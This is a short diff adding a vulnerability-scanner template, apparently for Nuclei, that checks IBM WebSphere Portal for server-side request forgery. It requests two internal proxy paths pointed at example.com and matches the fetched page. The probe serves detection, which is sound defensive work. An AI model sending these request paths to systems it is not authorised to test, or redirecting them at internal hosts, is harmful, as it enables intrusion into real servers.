@@ -1,0 +1,23 @@
+id: ibm-websphere-ssrf
+info:
+  author: pdteam
+  name: IBM WebSphere Portal SSRF
+  reference: https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/
+  severity: high
+  tags: ibm,ssrf,websphere
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - type: word
+    words:
+    - <title>Example Domain</title>
+  matchers-condition: and
+  max-redirects: 2
+  method: GET
+  path:
+  - '{{BaseURL}}/docpicker/internal_proxy/http/example.com'
+  - '{{BaseURL}}/wps/PA_WCM_Authoring_UI/proxy/http/example.com'
+  redirects: true
+  stop-at-first-match: true
